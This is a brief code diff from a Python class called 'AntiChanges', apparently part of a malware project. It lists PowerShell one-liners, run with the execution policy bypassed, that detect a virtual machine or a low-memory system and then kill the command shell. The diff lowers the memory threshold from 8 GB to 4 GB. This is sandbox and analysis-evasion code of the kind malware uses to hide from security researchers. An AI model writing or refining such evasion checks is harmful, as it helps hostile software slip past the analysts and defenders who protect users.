@@ -52,7 +52,7 @@ class AntiChanges:
             # I love batch so much I gave up and used powershell
             # Now that I think about it it would have been a LOT more logical to use encoded command since its all base64
             """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }\"""",
-            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 8) {spps -f -n "cmd" -ErrorAction SilentlyContinue;exit 1}\"""",
+            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}\"""",
         ]
         # ill add more one day
         ran_choice = random.choice(codes)
